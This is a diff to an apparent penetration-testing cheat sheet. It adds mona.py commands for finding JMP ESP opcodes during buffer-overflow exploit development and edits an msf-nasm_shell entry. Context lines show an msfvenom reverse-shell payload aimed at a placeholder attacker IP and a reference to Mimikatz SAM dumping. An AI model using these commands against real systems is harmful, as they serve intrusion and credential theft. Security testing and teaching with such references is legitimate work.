@@ -1630,6 +1630,17 @@ lsadump::sam
 
 
 
+## MONA.PY
+```python
+# display modules + their memory protections
+!mona modules
+
+# find hex_opcode_here in module - e.h. \xff\xe4 = JMP ESP
+!mona find -s "hex_opcode_here" -m dll_here
+```
+
+
+
 ## MONGO
 ```sql
 # connect to mongoDB database
@@ -1669,9 +1680,9 @@ msfvenom -p windows/shell_reverse_tcp LHOST=attacker_IP LPORT=port_here -f hta-p
 
 ## MSF-NASM_SHELL
 ```bash
-# find opcode for jump to ESP
+# find hex opcode for assembly instruction
 msf-nsm_shell
-jmp esp
+assembly_instruction_here
 ```
 
 
